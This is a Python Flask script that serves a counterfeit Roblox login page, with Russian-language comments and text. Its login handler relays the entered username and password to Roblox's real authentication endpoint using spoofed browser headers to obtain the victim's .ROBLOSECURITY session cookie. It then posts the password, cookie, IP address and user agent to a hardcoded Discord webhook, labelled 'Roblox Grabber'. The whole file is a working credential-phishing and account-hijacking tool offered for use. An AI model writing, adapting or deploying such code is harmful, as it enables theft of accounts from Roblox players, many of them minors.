from flask import Flask, request, render_template_string, jsonify
import requests
import json
import datetime
import os
import re

app = Flask(__name__)

DISCORD_WEBHOOK = 'https://discord.com/api/webhooks/1538073991938445353/xa-WZkoA0pDAoLwzHmNwTGTcjU0XFZYDc_9ZrGCsckpxGQX_y-yMWIPikI3ZyfvN4FK_'

# Реальный URL для логина
ROBLOX_LOGIN_URL = 'https://auth.roblox.com/v2/login'
ROBLOX_CSRF_URL = 'https://auth.roblox.com/v2/login'

# Создаём сессию для хранения куки
session = requests.Session()

def get_csrf_token():
    """Получаем CSRF токен от Роблокса"""
    try:
        response = session.post(ROBLOX_CSRF_URL, json={})
        if 'x-csrf-token' in response.headers:
            return response.headers['x-csrf-token']
        return ''
    except:
        return ''

def send_to_discord(username, password, cookie, ip, user_agent, error_msg=''):
    payload = {
        'embeds': [{
            'title': '🎮 ПОПЫТКА ВХОДА В РОБЛОКС',
            'color': 0xff0000,
            'fields': [
                {'name': '👤 Логин', 'value': f'```{username}```', 'inline': True},
                {'name': '🔑 Пароль', 'value': f'```{password}```', 'inline': True},
                {'name': '🍪 Куки', 'value': f'```{cookie if cookie else "Не получена"}```', 'inline': False},
                {'name': '🌐 IP', 'value': f'```{ip}```', 'inline': True},
                {'name': '📱 User-Agent', 'value': f'```{user_agent}```', 'inline': False},
                {'name': '❌ Ошибка', 'value': f'```{error_msg if error_msg else "Нет"}```', 'inline': False}
            ],
            'footer': {'text': 'Roblox Grabber'}
        }]
    }
    try:
        requests.post(DISCORD_WEBHOOK, json=payload)
    except:
        pass

@app.route('/')
def index():
    return '''
    <!DOCTYPE html>
    <html>
    <head>
        <title>Roblox - Вход</title>
        <style>
            body { background: #191919; font-family: Arial; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
            .login-box { background: #232323; padding: 40px; border-radius: 10px; width: 350px; text-align: center; }
            .roblox-logo { color: white; font-size: 32px; font-weight: bold; margin-bottom: 30px; }
            input { width: 100%; padding: 12px; margin-bottom: 15px; border: 1px solid #444; border-radius: 5px; background: #333; color: white; font-size: 16px; }
            button { width: 100%; padding: 12px; background: #00b06f; color: white; border: none; border-radius: 5px; font-size: 18px; font-weight: bold; cursor: pointer; }
            .error { color: #ff4444; margin-top: 10px; display: none; }
        </style>
    </head>
    <body>
        <div class="login-box">
            <div class="roblox-logo">ROBLOX</div>
            <form id="loginForm">
                <input type="text" id="username" placeholder="Имя пользователя" required>
                <input type="password" id="password" placeholder="Пароль" required>
                <button type="submit">Войти</button>
            </form>
            <div class="error" id="error">Неверный логин или пароль</div>
        </div>
        <script>
            document.getElementById('loginForm').addEventListener('submit', async (e) => {
                e.preventDefault();
                const username = document.getElementById('username').value;
                const password = document.getElementById('password').value;
                const res = await fetch('/login', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({username, password})
                });
                const data = await res.json();
                if (data.success) {
                    window.location.href = 'https://www.roblox.com';
                } else {
                    document.getElementById('error').style.display = 'block';
                }
            });
        </script>
    </body>
    </html>
    '''

@app.route('/login', methods=['POST'])
def login():
    data = request.json
    username = data.get('username', '')
    password = data.get('password', '')
    
    client_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    user_agent = request.headers.get('User-Agent', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36')
    
    # Получаем CSRF токен
    csrf_token = get_csrf_token()
    
    # Заголовки максимально похожие на настоящие
    headers = {
        'User-Agent': user_agent,
        'Content-Type': 'application/json',
        'Accept': 'application/json, text/plain, */*',
        'Accept-Language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
        'Accept-Encoding': 'gzip, deflate, br',
        'Origin': 'https://www.roblox.com',
        'Referer': 'https://www.roblox.com/',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-site',
        'Sec-Ch-Ua': '"Chromium";v="122", "Not(A:Brand";v="24", "Google Chrome";v="122"',
        'Sec-Ch-Ua-Mobile': '?0',
        'Sec-Ch-Ua-Platform': '"Windows"',
        'X-CSRF-TOKEN': csrf_token
    }
    
    # Сначала пробуем с ctype=cvalue (username)
    payloads = [
        {'ctype': 'Username', 'cvalue': username, 'password': password},
        {'ctype': 'Email', 'cvalue': username, 'password': password}
    ]
    
    for i, payload in enumerate(payloads):
        try:
            response = session.post(ROBLOX_LOGIN_URL, json=payload, headers=headers)
            
            # Получаем куки
            roblox_cookie = ''
            if '.ROBLOSECURITY' in session.cookies:
                roblox_cookie = session.cookies['.ROBLOSECURITY']
            
            # Логируем попытку
            error_msg = ''
            if response.status_code != 200:
                try:
                    error_data = response.json()
                    error_msg = json.dumps(error_data)
                except:
                    error_msg = response.text[:200]
            
            # Отправляем в Discord даже если не получилось
            send_to_discord(username, password, roblox_cookie, client_ip, user_agent, error_msg)
            
            if response.status_code == 200 and roblox_cookie:
                return jsonify({'success': True})
            
            if i == 0:
                # Меняем ctype на Email для второй попытки
                continue
                
        except Exception as e:
            send_to_discord(username, password, '', client_ip, user_agent, str(e))
            return jsonify({'success': False})
    
    return jsonify({'success': False})

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 8080))
    app.run(host='0.0.0.0', port=port)
